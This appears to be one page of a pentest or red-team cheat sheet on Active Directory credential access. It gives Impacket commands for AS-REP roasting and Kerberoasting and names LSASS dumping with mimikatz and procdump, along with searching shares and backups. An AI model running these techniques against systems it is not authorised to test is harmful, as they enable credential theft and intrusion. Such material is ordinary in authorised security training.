# 03 – Credential Access

## Goal

Obtain usable credentials

---

## AS-REP Roasting

```bash
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
```

---

## Kerberoasting

```bash
GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -request
```

---

## SMB / Files

- search shares
- config files
- backups

---

## LSASS Dump (if possible)

- mimikatz
- procdump

---

## Golden Rule

Credentials unlock everything